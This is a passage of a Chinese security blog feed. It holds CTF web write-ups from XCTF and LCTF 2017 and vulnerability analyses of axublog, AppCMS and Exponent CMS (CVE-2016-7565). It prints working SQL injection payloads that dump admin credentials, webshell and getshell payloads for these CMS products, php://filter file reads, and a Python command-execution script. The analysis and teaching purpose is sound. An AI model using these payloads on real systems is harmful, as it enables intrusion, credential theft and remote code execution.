username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’+UNION+ALL+SELECT+32,32,CONCAT((SELECT+GROUP_CONCAT(username,password,question,answer+SEPARATOR+0x3c62723e)+FROM+cetCCHqy004.admin)),32#1234![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/10.jpg?raw=true)# 请关注工控云管理系统的警告记录## 题目 参与工控云管理系统警告记录的活动，可能奖励你一个flaghttp://47.104.166.183:200081234567891011121314151617181920212223242526## Solution题目给了源码，在 http://47.104.166.183:20008/getflag.php```php&lt;?php if(!isset($_GET[&apos;c&apos;]) &amp;&amp; !isset($_GET[&apos;re&apos;])) &#123; show_source(__FILE__); &#125; $selfdir = $_GET[&apos;dir&apos;]; if (!isset($selfdir)) &#123; die(); &#125; $secret = &apos;/var/www/html/hackme/&apos; . md5(&quot;cetcrce&quot; . $selfdir . $_SERVER[&apos;REMOTE_ADDR&apos;]); @chdir(&apos;hackme&apos;); @mkdir($secret); @chdir($secret); if (isset($_GET[&apos;c&apos;]) &amp;&amp; strlen($_GET[&apos;c&apos;]) &lt;= 5) &#123; include(&apos;waf.php&apos;); @exec($_GET[&apos;c&apos;]); &#125;elseif(isset($_GET[&apos;re&apos;])) &#123; @exec(&apos;/bin/rm -rf &apos; . $secret); @exec(&apos;touch /var/www/html/hackme/index.php&apos;); &#125;?&gt; 相比于hitcon17的babyfirst，多了个waf.php，但不知道它的具体内容。参考 HITCON CTF 2017-BabyFirst Revenge-writeup 用wget获取文件index.html，执行sh i*即可执行sh index.html： flag:1flag&#123;J0w_ab0ut_c0mmAnd_3xcu&#125; 工控云管理系统项目管理页面解析漏洞题目12这个工控云管理系统的解析漏洞要靠管理员去修补。http://47.104.156.32:20007 Solution点进去后，点击项目管理，发现url为：1http://47.104.156.32:20007/index.php?page=flag.php 同时有一个view-source按钮，给了源码：123456789101112131415161718192021222324252627282930313233343536&lt;?php if ($_SESSION['admin']) &#123; $con = $_POST['con']; $file = $_POST['file']; $filename = "backup/".$file; if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename))&#123; die("Bad file extension"); &#125;else&#123; chdir('uploaded'); $f = fopen($filename, 'w'); fwrite($f, $con); fclose($f); &#125; &#125;?&gt;&lt;?php if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') &#123; include 'config.php'; $id = mysql_real_escape_string($_GET[id]); $sql="select * from cetc007.user where id='$id'"; $result = mysql_query($sql); $result = mysql_fetch_object($result); &#125; else &#123; $result = False; die(); &#125; if(!$result)die("&lt;br &gt;something wae wrong ! &lt;br&gt;"); if($result)&#123; echo "id: ".$result-&gt;id."&lt;/br&gt;"; echo "name:".$result-&gt;user."&lt;/br&gt;"; $_SESSION['admin'] = True; &#125; ?&gt; 接下来这段代码：12345678910111213141516&lt;?php if ($_SESSION['admin']) &#123; $con = $_POST['con']; $file = $_POST['file']; $filename = "backup/".$file; if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename))&#123; die("Bad file extension"); &#125;else&#123; chdir('uploaded'); $f = fopen($filename, 'w'); fwrite($f, $con); fclose($f); &#125; &#125; ?&gt; 参考 http://wonderkun.cc/index.html/?p=626 云工控管理系统文档中心的秘密题目12云工控管理系统的文档中心页面，存在不易被发现的漏洞。http://47.104.73.107:20002/ SolutionYUNWAF的突破_华为云题目12工控云管理系统新版本，有防护了。不知道防护有没有用。http://huaweicetc.xctf.org.cn SolutionYUNWAF的突破_阿里题目12工控云管理系统新版本，有防护了。不知道防护有没有用。http://alicetc.xctf.org.cn Solution]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[axublog v1.0.6 两处sql注入分析]]></title>
      <url>%2F2017%2F12%2F26%2Faxublog-v1-0-6-%E4%B8%A4%E5%A4%84sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[继续水一水，把以前随手看的发上来。 axublog下载地址：http://www.axublog.com/post/axublog_jian_zhan_xi_tong_update_download/#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80 sql注入一：hit.phphit.php的代码量较小，这里直接贴出来：123456789101112131415161718192021&lt;?phpheader("Content-type:text/html; charset=utf-8");require("cmsconfig.php");require("class/c_other.php");sqlguolv();$g=$_GET['g'];if ($g=='arthit')&#123; $id=$_GET['id']; if($id!='')&#123; $tab=$tabhead."arts"; mysql_select_db($tab); $sql=mysql_query("UPDATE ".$tab." SET hit=hit+1 where id=".$id); $sql = mysql_query("select * from ".$tab." where id=".$id); $row=mysql_fetch_array($sql); $str=$row['hit']; echo 'document.write('.$str.');'; &#125;&#125;?&gt; 其中sqlguolv()函数定义在 class\c_other.php的第545行左右：1234Function sqlguolv() &#123; @header(&quot;Content-type:text/html; charset=utf-8&quot;);if (preg_match(&apos;/select|insert|update|delete|\&apos;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&apos;,$_SERVER[&apos;QUERY_STRING&apos;])==1 or preg_match(&apos;/select|insert|update|delete|\&apos;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&apos;,file_get_contents(&quot;php://input&quot;))==1)&#123;echo &quot;警告 非法访问！&quot;; exit;&#125;&#125; 不过由于程序没有考虑到编码的问题，因此可以对某些关键字进行url编码进行绕过。 结合表的结构，可以构造出以下payload：1http://127.0.0.1:2500/axublog/axublog1.0.6install/hit.php?g=arthit&amp;id=0+uni%6fn+s%65l%65ct+1,1,1,1,1,1,group_concat(id,0x3c62723e,adnaa,0x3c62723e,adpss,0x3c62723e),1,1,1,1,1+fro%6d+axublog_adusers sql注入二：ad/login.php填写用户名和密码后，点击提交，会访问login.php?g=jsloginpost12345678910111213&lt;?php..@$user=$_POST["user"];@$psw=$_POST["psw"];@$loginlong=$_POST["loginlong"];@$g=$_GET["g"]; switch ($g) &#123; case "jsloginpost":jsloginpost();break; case "exit":loginexit();break; default:index();break; &#125; 第84行左右：12345678910111213141516171819202122232425262728293031&lt;?php...function jsloginpost()&#123;global $tabhead;global $txtchk;@$user=$_POST["user"];@$psw=$_POST["psw"];$psw = authcode(@$psw, 'ENCODE', 'key',0);@$loginlong=$_POST["loginlong"];setcookie("lggqsj",date('Y-m-d H:i:s',time()+$loginlong), time()+60*60*24,"/; HttpOnly" , "",'');$tab=$tabhead."adusers";$chk=" where adnaa='".$user."' and adpss='".$psw."' ";mysql_select_db($tab);$sql = mysql_query("select * from ".$tab.$chk);if(!$sql)&#123;$jieguo="&lt;div id=redmsg&gt;(数据库查询失败!)&lt;/div&gt;";&#125;else&#123; $num=mysql_num_rows($sql); if($num==0)&#123;$jieguo='&lt;div id=redmsg&gt;登录失败：账户或密码错误！&lt;/div&gt;';&#125; else&#123;loginpass($loginlong); $jieguo='&lt;div id=bluemsg&gt;登录成功！正在前往&lt;a href="index.php"&gt;后台&lt;/a&gt;。。。&lt;/div&gt;&lt;meta http-equiv="refresh" content="1;url=index.php"&gt;'; @$chkmoblie=isMobile(); if($chkmoblie==1)&#123;$jieguo='&lt;div id=bluemsg&gt;登录成功！正在前往&lt;a href="wap.php"&gt;后台&lt;/a&gt;。。。&lt;/div&gt;&lt;meta http-equiv="refresh" content="1;url=wap.php"&gt;';&#125; &#125;&#125;$json_arr = array("jieguo"=&gt;$jieguo);$json_obj = json_encode($json_arr);echo $json_obj;&#125; 所以可以惊奇的发现，这里没有任何过滤，单引号也没有，啥都没有。。。。 为方便，我加了一句echo $chk; 登陆成功。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AppCMS 2.0.101 后门分析]]></title>
      <url>%2F2017%2F12%2F17%2FAppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[AppCMS 2.0.101 后门分析 源码下载地址：http://www.appcms.cc/html/gengxin.html 官方的更新时间是 2015-8-1 分析用beyond compare比较与前一个版本的区别 可以发现，在 templates/m/ 文件夹下出现了一个 content_list.php 文件，修改时间为 2017年5月25日。 经过解密，9c224bc6b59179729b15e1dddcbb5c82为字符串kejishidai的md5值。 由代码知，这里存在一个copy函数构成的后门。 在第12行，实际执行的即为:1copy(trim($_GET[url]),$_GET[cms]); 将参数url设置为php://input，参数cms设置为shell的文件名，然后POST传入webshell。如下：1234http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/content_list.php?session=kejishidai&amp;url=php://input&amp;cms=temp.phpPOST:&lt;?php phpinfo();?&gt; 接着访问：1http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/temp.php getshell。 建议删除 templates/m/ 文件夹下的content_list.php。 OthercmsPoc]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[CVE-2016-7565]Exponent CMS 2.3.9 配置文件写入 getshell分析]]></title>
      <url>%2F2017%2F12%2F11%2FCVE-2016-7565-Exponent-CMS-2-3-9-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-getshell%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[最近一直在给cmsPoc写各种cms的exp/poc。遇到了这个配置文件写入从而getshell的洞，想到了P神-代码审计圈里分享过的一道审计题，借此分析一波。 漏洞复现 cmsPoc里用的payload如下：1install/index.php?sc[SMTP_PORT]=25\\&apos;);echo `$_POST[chybeta]`;// 下面基于这个payload进行分析。 漏洞分析在 install/index.php 的第44行左右：1234&lt;?php...include_once('../exponent.php');expString::sanitize($_REQUEST); 在 framework/core/subsystems/expString.php 的第502行12345678910111213141516171819&lt;?php...public static function sanitize(&amp;$data) &#123;// return $data; if (is_array($data)) &#123; $saved_params = array(); if (!empty($data['controller']) &amp;&amp; $data['controller'] == 'snippet') &#123; $saved_params['body'] = $data['body']; // store snippet body &#125; foreach ($data as $var=&gt;$val) &#123;// $data[$var] = self::sanitize($val); $data[$var] = self::xss_clean($val); &#125; if (!empty($saved_params)) &#123; $data = array_merge($data, $saved_params); // add stored snippet body &#125; &#125; 由于 $_REQUEST是个数组，从代码中可以看到只经过了xss_clean的检查，这对我们的payload没有影响。因此经过sanitize后，仍然有sc[SMTP_PORT]=25\\&#39;);echo `$_POST[chybeta]`;// 继续分析，install/index.php 的第56行左右：1234567891011121314&lt;?php...// Create or update the config settingsif (isset($_REQUEST['sc'])) &#123; if (file_exists("../framework/conf/config.php")) &#123; // Update the config foreach ($_REQUEST['sc'] as $key =&gt; $value) &#123; expSettings::change($key, $value); &#125; &#125;...&#125; 对于一个已经安装完成的exponent，其文件framework/conf/config.php必定是存在的，所以当传入参数$_REQUEST[&#39;sc&#39;]，会进入更新config的流程。 expSettings::change定义在 framework\core\subsystems\expSettings.php中的第220行123456789&lt;?php...public static function change($var, $val)&#123; $conf = self::parseFile(BASE . 'framework/conf/config.php'); $conf[$var] = $val; self::saveValues($conf);&#125; self::parseFile定义在该文件的第140行，其作用是将config.php中的内容解析出来。接下去的一行，将我们传入的$key和$value进行设置，即执行：123$var = &quot;SMTP_PORT&quot;$val = &quot;25\\&apos;);echo `$_POST[chybeta]`;//&quot;;$conf[$var]=$val; 接下去进行写入，即self::saveValues，该函数定义在该文件expSettings.php的第175行左右： 123456789101112131415&lt;?php...public static function saveValues($values, $configname = '') //FIXME only used with themes and self::change() method&#123; $profile = null; $str = "&lt;?php\n"; foreach ($values as $directive =&gt; $value) &#123; $directive = trim(strtoupper($directive)); if ($directive == 'CURRENTCONFIGNAME') &#123; // save and strip out the profile name $profile = $value; continue; &#125; $str .= "define(\"$directive\","; $value = stripslashes($value); // slashes added by POST 可以看到对于$value，先经过了一次stripslashes，这会将value值中原有的反斜杠（\）去掉。25\\&#39;);echo `$_POST[chybeta]`;//中，25后面的第一个反斜杠（\）将会被去掉，再之后的一个反斜杠（\），被当作是后面单引号的转义符，因此不会被去除。因此$value的值为下面这个：125\&apos;);echo `$_POST[chybeta]`;// 完成上述操作后，继续执行1234567891011121314151617181920212223242526272829&lt;?phpif (substr($directive, -5, 5) == "_HTML") &#123; $value = htmlentities($value, ENT_QUOTES, LANG_CHARSET);// $value = str_replace(array("\r\n","\r","\n"),"&lt;br /&gt;",$value); $value = str_replace(array("\r\n", "\r", "\n"), "", $value);// $value = str_replace(array('\r\n', '\r', '\n'), "", $value); $str .= "exponent_unhtmlentities('$value')";&#125; elseif (is_int($value)) &#123; $str .= "'" . $value . "'";&#125; else &#123; if ($directive != 'SESSION_TIMEOUT') &#123; $str .= "'" . str_replace("'", "\'", $value) . "'"; //FIXME is this still necessary since we stripslashes above??? &#125; // $str .= "'".$value."'"; else &#123; $str .= "'" . str_replace("'", '', $value) . "'"; &#125;&#125;$str .= ");\n";&#125;$str .= '?&gt;';// $configname = empty($values['CURRENTCONFIGNAME']) ? '' : $values['CURRENTCONFIGNAME'];if ($configname == '') &#123;$str .= "\n&lt;?php\ndefine(\"CURRENTCONFIGNAME\",\"$profile\");\n?&gt;"; // add profile name to end of active profile&#125;self::writeFile($str, $configname);&#125;?&gt; 由于我们的payload为sc[SMTP_PORT]，不以_HTML结尾，且不为SESSION_TIMEOUT，因此会执行下面这条语句：1$str .= &quot;&apos;&quot; . str_replace(&quot;&apos;&quot;, &quot;\&apos;&quot;, $value) . &quot;&apos;&quot;; 对应前面的$value，它将$value中的单引号前又加上了一次反斜杠，导致$value的值现在变为：125\\&apos;);echo `$_POST[chybeta]`;// 最后的操作就是将得到的内容写入到配置文件中了。 123define(&quot;SMTP_PORT&quot;,&apos;$value&apos;);即为define(&quot;SMTP_PORT&quot;,&apos;25\\&apos;);echo `$_POST[chybeta]`;//&apos;); 由于第一个反斜杠的存在，它把第二个反斜杠给转义了，从而导致了后面这个单引号的逃逸，进一步的使我们能够成功的闭合define。接下来又利用了php的//注释将原有的括号注释掉，从而getshell。 P神的审计题 与本次漏洞分析异曲同工之妙的一种解法如下： 1?option=aaa\&apos;;phpinfo();// 经过addslashes后，$str为 aaa\\\&#39;;phpinfo();// 经过preg_replace正则匹配后，对\做了转义处理,xxxxx/option.php的内容变为：123&lt;?php$option=&apos;aaa\\&apos;;phpinfo();//&apos;;?&gt; 同样利用第一个斜杠转义第二个斜杠，从而导致了单引号的逃逸。 另一种解答方法放在 Code-Audit-Challenges PHP challenge-3 更多解答，请见代码审计-知识星球。 (那个，有没有广告费？)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[LCTF-2017-他们有什么秘密呢-writeup]]></title>
      <url>%2F2017%2F11%2F19%2FLCTF-2017-%E4%BB%96%E4%BB%AC%E6%9C%89%E4%BB%80%E4%B9%88%E7%A7%98%E5%AF%86%E5%91%A2-writeup%2F</url>
      <content type="text"><![CDATA[补充关于第一阶段sql注入知识/背景，第二节阶段命令执行详细过程及其知识点 LCTF-2017-他们有什么秘密呢-writeup Task12一个简单到不能再简单的......http://182.254.246.93/ SolutionSQL注入 这是第一关。查看源代码后，有如下tips：1&lt;!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --&gt; 所以目标很明确。 经过测试，过滤了information等关键字。而union，select等则没有过滤。 参考mysql注入可报错时爆表名、字段名、库名 获取表名文章中利用的是Polygon()函数，这个也被过滤了。我换了linestring()来报错注入。 123http://182.254.246.93/entrance.phpPOST: pro_id=1 and linestring(pro_id) 得到如下信息：123数据库名：youcanneverfindme17表名：product_2017ctf部分字段名：pro_id 除了linestring和Polygon外，其他同样能用来报错获取得到当前表名和字段的还有： multiPolygon(id) multilinestring(id) GeometryCollection(id) MultiPoint(id) 查询字段名其实这一步，可以跳过。因为利用union搭配别名子查询，可以达到在不知道字段名的时候进行注入。 为了完整性，这里试一下注出字段名。 利用orangetw大佬的提过的技巧 基本的原理是子查询中不允许出现相同的表名，本地环境测试如下： 之后可以利用using来逐步爆出字段名： 举一反三： 第一步：12POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id)) as c);Duplicate column name &apos;pro_name&apos; 第二步：12POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name)) as c);Duplicate column name &apos;owner&apos; 第三步：12POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner)) as c);Duplicate column name &apos;d067a0fa9dc61a6e&apos; 得到如下信息：123库：youcanneverfindme17表：product_2017ctf字段: pro_id pro_name owner,d067a0fa9dc61a6e 查询数据参考文章： http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/ 123POST:pro_id=-2513 UNION ALL SELECT NULL,CONCAT((select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from product_2017ctf)e limit 1 offset 3 )),NULL,NULL--product name:7195ca99696b5a896.php 最终获得完整的结构与数据如下：1234product_id: 1,2,3product_name: car,iphone11,nextentranceowner:Tom John Bossd067a0fa9dc61a6e:wobuzaizheli nextnext 7195ca99696b5a896.php 其他在做的过程，有想利用innodb引擎来注入，不过好像没啥用233312345POST:pro_id=-2513 UNION ALL SELECT NULL,CONCAT((select table_name from innodb_table_stats)),NULL,NULL--&apos;youcanneverfindme17.innodb_table_stats&apos; doesn&apos;t exist数据库：youcanneverfindme17 根据tips，得到下一个入口地址:d067a0fa9dc61a6e7195ca99696b5a896.php PHP的命令执行http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php 到了这里就跟 32c3 2015 ctf-TinyHosting的题目很像了。 就几个知识点展开说一说。 一个是php的短标签。当php.ini的short_open_tag=on时，PHP支持短标签，默认情况下为off。当开启后能执行&lt;? ?&gt;标签内的php语句：12345chybeta@ubuntu:/var/www/html$ cat test.php&lt;? echo &quot;chybeta\n&quot;;?&gt;chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.phpchybetachybeta@ubuntu:/var/www/html$ 另一个知识点是php的反引号命令执行，php会反引号内的内容作为shell命令执行，效果与 shell_exec()同。12345chybeta@ubuntu:/var/www/html$ cat test.php&lt;? $temp = `date`; echo $temp;?&gt;chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.phpWed Nov 22 22:01:34 CST 2017chybeta@ubuntu:/var/www/html$ 第三个知识点是关于php的echo，echo有个快捷写法，可以在打开标记前直接用一个等号。见下：12345678chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.phpchybetachybeta@ubuntu:/var/www/html$ vim test.phpchybeta@ubuntu:/var/www/html$ cat test.php&lt;?=&quot;chybeta\n&quot;;chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.phpchybetachybeta@ubuntu:/var/www/html$ 我们的需求：执行命令，得到回显。结合上面三个知识点，在7个字节的限制下，比如构造如下（）：1&lt;?=`w`; （题外话：命令w用于显示已经登陆系统的用户列表） 运行结果： 不过怎么执行任意命令呢？这里用到第四个知识点，shell中的通配符*会将符合模式的文件列出来，之后执行，详情可见这里Shell 通配符。所以当文件夹下有如下文件：1bash z.sh 而我在shell中直接键入一个*即：1chybeta@ubuntu: * shell会匹配并进行替换，完成替换后实际执行的命令为：1chybeta@ubuntu: bash c.sh 由于这属于shell后台自动完成就不展示了。 接着要考虑一点，我们需要用*来利用文件名执行任意命令，因此在文件名的构造顺序上需要注意。比如我们最终要在文件下生成这三个文件:1bash c.sh z.php 才能成功的执行c.sh。 附上利用脚本：12345678910111213141516import requestsimport reurl = "http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php"user_agent = "xxx"while 1: command = raw_input("input command: ") t = requests.post(url, headers = &#123;'User-agent': user_agent &#125;, data = &#123;"filename":"z.php", "content":"&lt;?=`*`;"&#125;).text [path] = re.findall('files.*/zzz.php', t) requests.post(url, headers = &#123;'User-agent': user_agent &#125;, data = &#123;"filename":"bash", "content":'anything'&#125;) requests.post(url, headers = &#123;'User-agent': user_agent &#125;, data = &#123;"filename":"c.sh", "content": command&#125;) url1 = "http://182.254.246.93/" r = requests.get(url1+path) print r.text flag:1$flag = &quot;LCTF&#123;n1ver_stop_nev2r_giveup&#125;&quot;; 小结 基于报错的sql注入： 获取库名，表名，列名，数据 join using php技巧: 短标签 反引号 echo缩写 shell通配符]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[LCTF-2017-萌萌哒报名系统-writeup]]></title>
      <url>%2F2017%2F11%2F19%2FLCTF-2017-%E8%90%8C%E8%90%8C%E5%93%92%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F-writeup%2F</url>
      <content type="text"><![CDATA[趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！先放上简单的wp版本，一些细节后续再更新吧。 LCTF-2017-萌萌哒报名系统-writeup Task12天依花了一整天的时间用IDE开发了一个报名系统，现在她睡着了，难道你们不想做点什么嘛XD?http://123.206.120.239/ Solution源码泄露根据题目信息，用了IDE,比如phpstrom，以前做百度杯时碰到过。尝试访问:1http://123.206.120.239/.idea/workspace.xml 发现源码包：xdcms2333.zip。下载下来进行审计。 基本流程梳理regisrer.php12345678910111213141516171819202122232425262728293031323334&lt;?php include('config.php'); try&#123; $pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass); &#125;catch (Exception $e)&#123; die('mysql connected error'); &#125; $admin = "xdsec"."###".str_shuffle('you_are_the_member_of_xdsec_here_is_your_flag'); $username = (isset($_POST['username']) === true &amp;&amp; $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username'); $password = (isset($_POST['password']) === true &amp;&amp; $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password'); $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : ''; if (strlen($username) &gt; 16 || strlen($username) &gt; 16) &#123; die('Invalid input'); &#125; $sth = $pdo-&gt;prepare('SELECT username FROM users WHERE username = :username'); $sth-&gt;execute([':username' =&gt; $username]); if ($sth-&gt;fetch() !== false) &#123; die('username has been registered'); &#125; $sth = $pdo-&gt;prepare('INSERT INTO users (username, password) VALUES (:username, :password)'); $sth-&gt;execute([':username' =&gt; $username, ':password' =&gt; $password]); preg_match('/^(xdsec)((?:###|\w)+)$/i', $code, $matches); if (count($matches) === 3 &amp;&amp; $admin === $matches[0]) &#123; $sth = $pdo-&gt;prepare('INSERT INTO identities (username, identity) VALUES (:username, :identity)'); $sth-&gt;execute([':username' =&gt; $username, ':identity' =&gt; $matches[1]]); &#125; else &#123; $sth = $pdo-&gt;prepare('INSERT INTO identities (username, identity) VALUES (:username, "GUEST")'); $sth-&gt;execute([':username' =&gt; $username]); &#125; echo '&lt;script&gt;alert("register success");location.href="./index.html"&lt;/script&gt;'; login.php1234567891011121314151617181920212223242526&lt;?php session_start(); include('config.php'); try&#123; $pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass); &#125;catch (Exception $e)&#123; die('mysql connected error'); &#125; $username = (isset($_POST['username']) === true &amp;&amp; $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username'); $password = (isset($_POST['password']) === true &amp;&amp; $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password'); if (strlen($username) &gt; 32 || strlen($password) &gt; 32) &#123; die('Invalid input'); &#125; $sth = $pdo-&gt;prepare('SELECT password FROM users WHERE username = :username'); $sth-&gt;execute([':username' =&gt; $username]); if ($sth-&gt;fetch()[0] !== $password) &#123; die('wrong password'); &#125; $_SESSION['username'] = $username; unset($_SESSION['is_logined']); unset($_SESSION['is_guest']); #echo $username; header("Location: member.php");?&gt; member.php123456789101112131415161718192021222324252627282930&lt;?php error_reporting(0); session_start(); include('config.php'); if (isset($_SESSION['username']) === false) &#123; die('please login first'); &#125; try&#123; $pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass); &#125;catch (Exception $e)&#123; die('mysql connected error'); &#125; $sth = $pdo-&gt;prepare('SELECT identity FROM identities WHERE username = :username'); $sth-&gt;execute([':username' =&gt; $_SESSION['username']]); if ($sth-&gt;fetch()[0] === 'GUEST') &#123; $_SESSION['is_guest'] = true; &#125; $_SESSION['is_logined'] = true; if (isset($_SESSION['is_logined']) === false || isset($_SESSION['is_guest']) === true) &#123; &#125;else&#123; if(isset($_GET['file'])===false) echo "None"; elseif(is_file($_GET['file'])) echo "you cannot give me a file"; else readfile($_GET['file']); &#125;?&gt; php的preg_match在code部分填入超长的字符串，并且符合preg_match匹配的模式。则在register.php在preg_match时导致超时php脚本停止，字符串guest没有被插入成功。之后在login.php中登陆用户跳转至member.php后，下述代码将会跳过:123if ($sth-&gt;fetch()[0] === &apos;GUEST&apos;) &#123; $_SESSION[&apos;is_guest&apos;] = true;&#125; 并在接下来的判断中，进入else分支：123456if(isset($_GET[&apos;file&apos;])===false) echo &quot;None&quot;;elseif(is_file($_GET[&apos;file&apos;])) echo &quot;you cannot give me a file&quot;;else readfile($_GET[&apos;file&apos;]); 上次微信崩溃，好像也是正则匹配搞得鬼嘛。二者原理不同，不过应该还是有某种神似的。 php的is_file和readfile在进入成功后，需要提供file参数来读取文件。需要绕过is_file，考虑配合php伪协议。1/member.php?file=php://filter/read=convert.base64-encode/resource=config.php isfile判断为假，而readfile利用伪协议读取到config.php文件 得到config.php源码：12345&lt;?php$user = "xdsec";$pass = "xdsec";$flag = "LCTF&#123;pr3_maTch_1s_A_amaz1ng_Function&#125;"?&gt; flag:1LCTF&#123;pr3_maTch_1s_A_amaz1ng_Function&#125; 小结 PHP的preg_match isfile、readfile]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[LCTF 2017-Simple blog-writeup]]></title>
      <url>%2F2017%2F11%2F18%2FLCTF-2017-Simple-blog-writeup%2F</url>
      <content type="text"><![CDATA[更新： CBC翻转攻击脚本 格式化字符串sql注入详细解答 趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！ LCTF 2017-Simple blog-writeup Task12A simple blog .To discover the secret of it.http://111.231.111.54/ Solution源码泄露12http://111.231.111.54/.login.php.swphttp://111.231.111.54/.admin.php.swp 下载下来后，用vim -r恢复，得到源代码： login.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?phperror_reporting(0);session_start();define("METHOD", "aes-128-cbc");include('config.php');function show_page()&#123; echo '省略';&#125;function get_random_token()&#123; $random_token = ''; $str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"; for($i = 0; $i &lt; 16; $i++)&#123; $random_token .= substr($str, rand(1, 61), 1); &#125; return $random_token;&#125;function get_identity()&#123; global $id; $token = get_random_token(); $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token); $_SESSION['id'] = base64_encode($c); setcookie("token", base64_encode($token)); if($id === 'admin')&#123; $_SESSION['isadmin'] = 1; &#125;else&#123; $_SESSION['isadmin'] = 0; &#125;&#125;function test_identity()&#123; if (isset($_SESSION['id'])) &#123; $c = base64_decode($_SESSION['id']); $token = base64_decode($_COOKIE["token"]); if($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123; if ($u === 'admin') &#123; $_SESSION['isadmin'] = 1; return 1; &#125; &#125;else&#123; die("Error!"); &#125; &#125; return 0;&#125;if(isset($_POST['username'])&amp;&amp;isset($_POST['password']))&#123; $username = mysql_real_escape_string($_POST['username']); $password = $_POST['password']; $result = mysql_query("select password from users where username='" . $username . "'", $con); $row = mysql_fetch_array($result); if($row['password'] === md5($password))&#123; get_identity(); header('location: ./admin.php'); &#125;else&#123; die('Login failed.'); &#125;&#125;else&#123; if(test_identity())&#123; header('location: ./admin.php'); &#125;else&#123; show_page(); &#125;&#125;?&gt; admin.php的源码后面放出。 经过测试，存在账号和密码，分别为admin和admin。在login.php页面登陆后会跳转到admin.php。默认情况下，由于并非真实admin，在跳转后会显示you are not admin. CBC翻转字节攻击鉴于篇幅的原因，关于CBC翻转字节攻击这里就不多讲了。在观察login.php，以及加上一点点的社工后，可以发现跟NJCTF的某题神似。借网络的脚本，修改了一下，增加登陆页面的验证以及跑出token后的结束标志： 